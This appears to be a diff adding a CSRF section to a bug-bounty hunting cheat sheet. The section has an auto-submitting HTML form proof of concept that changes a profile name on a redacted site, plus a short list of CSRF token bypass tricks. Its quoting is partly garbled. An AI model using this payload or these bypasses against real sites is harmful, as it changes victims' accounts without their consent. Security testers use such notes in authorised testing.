@@ -504,3 +504,34 @@
 	
 	cat domain.txt | kxss
 </details>
+
+-----------------------------------------------------------------------------
+
+<details>
+	<summary>CSRF</summary>
+
+	poc: 
+		 <html>
+		  <body>
+		    <form action="https://redacted.com/profile/edit” method="POST">
+		      <input type="hidden" name=“first_”name value=“Attacker” />
+		    </form>
+		    <script>
+		      document.forms[0].submit();
+		    </script>
+		  </body>
+		</html>
+
+	=================================================
+ 	
+  	1- Remove the token and leave the parameter empty
+  	2- Try use another user CSRF token
+   	3- Change the request method to get and remove the token
+    	4- Add Ayhaga to the real CSRF token 
+     	5- Dynamic chars in CSRF token manipulate
+
+ 
+</details>
+
+
+
